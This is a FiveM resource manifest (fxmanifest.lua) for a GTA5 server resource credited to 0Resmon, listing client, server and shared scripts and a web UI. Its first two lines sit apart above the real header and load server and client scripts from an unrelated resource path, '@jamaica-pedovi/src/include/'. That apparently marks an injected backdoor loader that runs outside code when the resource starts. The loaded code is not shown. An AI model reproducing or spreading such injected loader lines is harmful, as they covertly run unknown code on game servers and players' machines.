server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'




fx_version          "bodacious"
game                "gta5"
author              "0Resmon"
discord             "discord.gg/0resmon"
description         "Created for 0Resmon Resources"
version             "1.0.1"

creator "Kibra"

client_scripts {
    "modules/client/main.lua",
    "modules/client/events.lua"
}

server_scripts {
	"@oxmysql/lib/MySQL.lua",
    "modules/server/main.lua",
    "modules/server/events.lua"
}

escrow_ignore {
    "config.lua"
}

ui_page "web/index.html"

files {
    "web/index.html",
    "web/sound.mp3",
    "web/index.js",
    "web/style.css"
}

shared_scripts {
    "config.lua",
    "shared/common.lua",
    "shared/blips.lua"
}

lua54 "yes"
dependency '/assetpacks'